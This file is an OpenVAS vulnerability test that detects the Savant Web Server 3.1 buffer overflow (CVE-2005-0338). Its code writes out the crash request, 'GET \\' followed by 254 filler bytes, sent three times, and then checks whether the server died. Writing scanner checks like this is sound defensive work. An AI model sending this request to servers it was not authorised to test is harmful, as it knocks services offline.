###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_savant_web_server_remote_bof_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Savant Web Server Remote Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to execute arbitrary code
  within the context of the application or cause a denial of service condition.
  Impact Level: System/Application";
tag_affected = "Savant Web Server version 3.1";
tag_insight = "The flaw is due to a boundary error when processing malformed HTTP
  request. This can be exploited to cause a stack-based overflow via a long
  HTTP request.";
tag_solution = "No solution or patch is available as of 23rd January, 2012. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://savant.sourceforge.net/index.html";
tag_summary = "This host is running Savant Web Server and prone to buffer overflow
  vulnerability.";

if(description)
{
  script_id(802296);
  script_version("$Revision: 12 $");
  script_bugtraq_id(12429);
  script_cve_id("CVE-2005-0338");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-01-23 14:14:14 +0530 (Mon, 23 Jan 2012)");
  script_name("Savant Web Server Remote Buffer Overflow Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check if Savant Web Server is vulnerable to buffer overflow");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/12429");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/19177");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18401");
  script_xref(name : "URL" , value : "http://marc.info/?l=full-disclosure&amp;m=110725682327452&amp;w=2");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)) {
  exit(0);
}

## Get Banner And Confirm Application
banner = get_http_banner(port: port);
if("Server: Savant/" >!< banner){
  exit(0);
}

## Construct Exploit
req = string("GET \\", crap(254), "\r\n\r\n");

## Send Exploit
for(i = 0; i < 3; i++){
  res = http_send_recv(port:port, data:req);
}

## Check server is dead or alive
if(http_is_dead(port:port)) {
  security_hole(port);
}
